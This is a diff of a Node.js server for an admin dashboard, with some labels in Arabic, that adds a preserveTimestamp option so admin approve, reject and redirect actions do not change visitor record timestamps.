@@ -1275,7 +1275,7 @@ async function startServer() {
         broadcastToVisitor(visitorId, `${boxType}RejectionMessage`, updateData[`${boxType}RejectionMessage`]);
       }
       
-      // Broadcast to dashboard
+      // Broadcast to dashboard - preserve timestamps (admin action, not customer data)
       const dashboardData = await upsertDashboardRequest({
         id: visitorId,
         visitorId: visitorId,
@@ -1283,7 +1283,7 @@ async function startServer() {
         ...currentVisitor,
         ...updateData,
         updated: `تم ${action === "approve" ? "الموافقة" : "الرفض"} على ${boxType}`
-      });
+      }, { preserveTimestamp: true }); // Don't update timestamps on admin actions
       
       broadcastToDashboard("dashboard:update", dashboardData);
       
@@ -1372,7 +1372,7 @@ async function startServer() {
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
-      // Broadcast to dashboard with updated timestamps
+      // Broadcast to dashboard - preserve timestamps (admin action)
       const dashboardData = await upsertDashboardRequest({
         id: visitorId,
         visitorId: visitorId,
@@ -1385,7 +1385,7 @@ async function startServer() {
           ...(currentVisitor?.raw || currentVisitor || {}),
           ...updateData,
         }
-      });
+      }, { preserveTimestamp: true }); // Don't update timestamps on admin actions
 
       console.log("[reflect-status] dashboardData.raw:", dashboardData.raw);
       broadcastToDashboard("dashboard:update", dashboardData);
@@ -2337,7 +2337,8 @@ async function startServer() {
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
       await upsertVisitor(visitorId, updateData);
 
-      // Preserve all existing visitor data for dashboard with updated timestamps
+      // Preserve all existing visitor data for dashboard - DON'T update timestamps
+      // This is an admin action, not customer data submission
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
@@ -2352,7 +2353,7 @@ async function startServer() {
           ...(currentVisitor?.raw || currentVisitor || {}),
           ...updateData,
         }
-      });
+      }, { preserveTimestamp: true }); // IMPORTANT: Don't update timestamps on redirect
 
       broadcastToDashboard("dashboard:update", dashboardData);
 
